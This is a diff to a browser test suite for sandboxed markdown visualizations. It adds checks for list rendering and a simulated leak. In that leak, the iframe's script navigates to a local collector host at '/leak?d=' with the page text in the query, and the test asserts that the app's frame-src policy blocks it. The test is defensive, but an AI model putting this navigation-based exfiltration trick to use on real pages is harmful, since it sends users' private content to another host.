@@ -38,6 +38,9 @@ const server = Bun.serve({ hostname: "127.0.0.1", port: 0, async fetch(request) 
   return new Response("not found", { status: 404 });
 } });
 const origin = `http://127.0.0.1:${server.port}`;
+// another host than the app's, as any site on the web is: a visualization's script must not reach it
+const leaks: string[] = [];
+const elsewhere = Bun.serve({ hostname: "localhost", port: 0, fetch(request) { leaks.push(request.url); return new Response("collected"); } });
 if (process.argv.includes("--serve")) {
   console.log(JSON.stringify({ origin, path, directive }));
   await new Promise(() => {});
@@ -93,10 +96,28 @@ try {
   await page.getByRole("button", { name: "Retry", exact: true }).click();
   await page.frameLocator("iframe").getByRole("button", { name: "Normal", exact: true }).waitFor();
   assert.equal(stats.length, before + 1);
+  // a reference indented under an ordered list's item is drawn in that item, and the list goes on as one
+  await page.evaluate((text) => window.visualizationQa.update(`1. First\n   ${text}\n1. Second`), directive);
+  const items = page.locator("ol > li");
+  await items.first().frameLocator("iframe.markdown-visualization-frame").getByRole("button", { name: "Normal", exact: true }).waitFor();
+  assert.equal(await items.count(), 2, "the visualization does not end its list");
+  assert.equal(await page.locator("ol").count(), 1);
+  assert.ok(!await page.locator("body").innerText().then((text) => text.includes("\uE200visualize")));
+  // the document's script holds what the Page renderer put into it; it cannot send it to another host by moving its own
+  // frame there (the app's frame-src), and the sandbox and the page's policy allow it no other request
+  await page.evaluate(() => addEventListener("securitypolicyviolation", (event) => { (window as unknown as { refused?: string[] }).refused = [event.effectiveDirective, event.blockedURI]; }, { once: true }));
+  const away = `http://localhost:${elsewhere.port}`;
+  await items.first().frameLocator("iframe.markdown-visualization-frame").locator("body").evaluate((_, to) => { setTimeout(() => { location.href = `${to}/leak?d=${encodeURIComponent(document.body.innerText)}`; }, 0); }, away);
+  await page.waitForFunction(() => (window as unknown as { refused?: string[] }).refused !== undefined);
+  const refused = await page.evaluate(() => (window as unknown as { refused: string[] }).refused);
+  assert.equal(refused[0], "frame-src", "the app refuses to frame another host");
+  assert.ok(refused[1]!.startsWith(away), refused[1]);
+  assert.deepEqual(leaks, [], "nothing reached the other host");
   assert.deepEqual(errors, []);
-  console.log("PASS original HTML/styles/controls preserved, no theme or host API injection, sandbox, PC ownership, 390px reflow, file opener and explicit retry");
+  console.log("PASS original HTML/styles/controls preserved, no theme or host API injection, sandbox, no navigation to another host, PC ownership, 390px reflow, a reference in a list item, file opener and explicit retry");
 } finally {
   await browser?.close();
   server.stop(true);
+  elsewhere.stop(true);
   rmSync(root, { recursive: true, force: true });
 }
